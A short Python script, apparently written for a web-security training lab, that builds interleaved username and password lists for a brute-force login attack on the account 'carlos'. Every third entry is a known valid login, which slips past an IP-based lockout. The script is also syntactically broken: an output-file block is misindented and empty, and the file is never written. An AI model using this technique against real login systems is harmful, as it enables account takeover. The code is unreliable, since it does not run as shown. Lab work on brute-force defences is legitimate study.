print("############# The following are the usernames: #############")

for i in range(150):
    if i % 3 == 0:
        print("wiener")
    else:
        print("carlos")

print("############# The following are the passwords: #############")

with open("passwords.txt", "r") as f:
    lines = f.readlines()
  with open("payload.txt", "w") as out:

i = 0
for pwd in lines:
    if i % 3 == 0:
        print("peter")
    print(pwd.strip())
    i += 1
